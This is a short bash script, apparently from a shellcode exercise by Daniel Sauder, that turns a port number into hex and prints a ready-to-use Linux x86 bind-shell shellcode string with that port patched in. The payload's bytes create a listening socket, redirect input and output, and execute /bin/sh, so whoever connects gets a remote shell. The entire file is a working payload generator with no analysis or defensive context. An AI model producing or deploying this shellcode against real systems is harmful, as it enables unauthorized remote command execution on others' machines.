#!/bin/bash

# Author: Daniel Sauder
# Website: http://govolution.wordpress.com/about
# License http://creativecommons.org/licenses/by-sa/3.0/

len=`echo "obase=16; $1"|bc | wc -c`
adr=""

if [ "$len" == "2" ]
 then
  tmp=`echo "obase=16; $1"|bc`
  adr=`echo "\\x0$tmp"`
fi

if [ "$len" == "3" ]
 then
  tmp=`echo "obase=16; $1"|bc`
  adr=`echo "\\x$tmp"`
fi

if [ "$len" == "4" ]
 then
  tmp=`echo "obase=16; $1"|bc`
  tmp1=`echo "$tmp"|cut -c1-1`
  tmp2=`echo "$tmp"|cut -c2-3`
  adr=`echo "\\x0$tmp1\\x$tmp2"`
fi

if [ "$len" == "5" ]
 then
  tmp=`echo "obase=16; $1"|bc`
  tmp1=`echo "$tmp"|cut -c1-2`
  tmp2=`echo "$tmp"|cut -c3-4`
  adr=`echo "\\x$tmp1\\x$tmp2"`
fi

echo "port as hex: $adr"
echo "shellcode:"
echo "\"\x6a\x66\x58\x31\xdb\x43\x31\xd2\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x6a\x66\x58\x43\x52\x66\x68$adr\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\xb0\x66\x43\x43\x53\x56\x89\xe1\xcd\x80\xb0\x66\x43\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3\x6a\x02\x59\xb0\x3f\xcd\x80\x49\xb0\x3f\xcd\x80\x49\xb0\x3f\xcd\x80\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80\""
